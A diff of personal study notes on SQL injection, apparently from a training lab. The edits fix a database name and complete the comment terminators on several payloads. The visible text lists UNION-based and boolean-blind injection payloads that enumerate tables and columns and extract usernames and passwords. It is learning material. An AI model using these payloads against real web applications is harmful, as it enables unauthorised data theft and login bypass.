@@ -6,7 +6,7 @@
 	- [[#Boolean Based]]
 	- [[#Time-Based]]
 - [[#Out-of-Band SQLi]]
-- 
+- [[#Remediation]]
 
 ___
 ### SQL Injection
@@ -49,7 +49,7 @@ Uses `SELECT` and `UNION`, common to extract large amounts of data
    --> displays article
 5. Change 1 with 0 so second part of query is displayed and not article: `0 UNION SELECT 1,2,3`
    --> displays column values 1, 2, 3
-6. `0 UNION SELECT 1,2,database()`: get name of database --> `sql_one`
+6. `0 UNION SELECT 1,2,database()`: get name of database --> `sqli_one`
 7. `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: lists all tables in sqli_one database --> `article,staff_users`
 8. `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'` --> `id,password,username`
 9. `0 UNION SELECT 1,2,group_concat(username,': ',password SEPARATOR '<br>') FROM staff_users`
@@ -62,7 +62,7 @@ ___
 #### Authentication Bypass
 [[#Table of contents|Back to the top]]
 
-Webapp less interested in whether username and password content, more in whether two make a matching pair
+Webapp less interested in username and password content, more in whether two make a matching pair
 --> no need to find a valid pair, just to create database query that replies with yes/true
 
 
@@ -92,11 +92,11 @@ Boolean refers to nature of response to injection attempt
    The name of the database is `sqli_three`
 6. Repeat process for tables (with `information_schema.tables`): `admin1' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
    --> we discover a table called `users`
-7. Repeat process for columns: `admin1' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
+7. Repeat process for columns: `admin1' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--`
 8. After finding the column `id`, exclude it from the search: `and COLUMN_NAME !='id'`
-9. We found a column called "username", we will test for usernames: `admin1' UNION SELECT 1,2,3 from users where username like 'a%`
+9. We found a column called "username", we will test for usernames: `admin1' UNION SELECT 1,2,3 from users where username like 'a%';--`
    We confirm the existence of `admin`
-10. We test for passwords: `admin1' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`
+10. We test for passwords: `admin1' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--`
     We find the password `3845`
 
 #### Time-Based
